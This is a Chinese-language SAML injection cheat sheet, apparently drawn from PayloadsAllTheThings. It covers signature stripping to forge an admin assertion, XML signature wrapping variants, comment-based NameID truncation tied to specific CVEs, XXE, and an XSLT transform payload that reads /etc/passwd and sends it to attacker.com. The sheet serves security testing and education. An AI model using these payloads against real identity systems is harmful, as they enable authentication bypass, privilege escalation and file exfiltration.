# SAML Injection - SAML注入

[SEARCH_KEYWORDS]
漏洞类型: SAML Injection SAML注入 Security Assertion Markup Language
攻击类型: Authentication Bypass Privilege Escalation XML Signature Bypass
关键词: SAMLResponse Assertion NameID Subject Signature XML
技术: Signature Stripping XSW XML Comment XXE XSLT
CVE: CVE-2017-11427 CVE-2017-11428 CVE-2018-0489

[CONTENT]

## SAML注入概述

SAML是用于在身份提供者和服务提供者之间交换认证和授权数据的开放标准。不当实现或配置可能暴露系统于各种漏洞。

## SAML响应结构

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
    <saml:Issuer>...</saml:Issuer>
    <samlp:Status>...</samlp:Status>
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>username</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>
```

## 无效签名

未由真实CA签名的签名容易被克隆。如果证书是自签名的，可能克隆证书或创建新的自签名证书替换。

## 签名剥离

伪造未签名的SAML断言。如果省略签名部分，某些配置不执行签名验证。

```xml
<saml2:Assertion>
    <saml2:Subject>
        <saml2:NameID>admin</saml2:NameID>
    </saml2:Subject>
    <!-- 无签名 -->
</saml2:Assertion>
```

## XML签名包装攻击 (XSW)

| 类型 | 描述 |
|------|------|
| XSW1 | 在签名后添加克隆的未签名Response副本 |
| XSW2 | 在签名前添加克隆的未签名Response副本 |
| XSW3 | 在Assertion前添加克隆的未签名Assertion副本 |
| XSW4 | 在Assertion内添加克隆的未签名Assertion副本 |
| XSW5 | 修改已签名副本并添加原始未签名副本 |
| XSW6 | 在签名后添加原始未签名副本 |
| XSW7 | 添加Extensions块包含克隆未签名断言 |
| XSW8 | 添加Object块包含未签名断言副本 |

### XSW示例

```xml
<SAMLResponse>
  <FA ID="evil">
      <Subject>Attacker</Subject>
  </FA>
  <LA ID="legitimate">
      <Subject>Legitimate User</Subject>
      <LAS>
         <Reference URI="legitimate"/>
      </LAS>
  </LA>
</SAMLResponse>
```

## XML注释处理

在用户名字段插入注释可绕过验证：

```xml
<NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
```

受影响库：
- OneLogin python-saml (CVE-2017-11427)
- OneLogin ruby-saml (CVE-2017-11428)
- Shibboleth (CVE-2018-0489)

## XML外部实体 (XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY s "s">
  <!ENTITY f1 "f1">
]>
<saml2p:Response>
  <saml2:AttributeValue>
    &s;taf&f1;
  </saml2:AttributeValue>
</saml2p:Response>
```

## XSLT攻击

```xml
<ds:Signature>
  <ds:Transforms>
    <ds:Transform>
      <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="doc">
          <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
          <xsl:value-of select="unparsed-text(concat('http://attacker.com/', encode-for-uri($file)))"/>
        </xsl:template>
      </xsl:stylesheet>
    </ds:Transform>
  </ds:Transforms>
</ds:Signature>
```

## 工具

- SAMLRaider - SAML2 Burp扩展
- ZAP SAML Support - SAML请求检测编辑工具

## 参考文档

原始来源: PayloadsAllTheThings/SAML Injection/README.md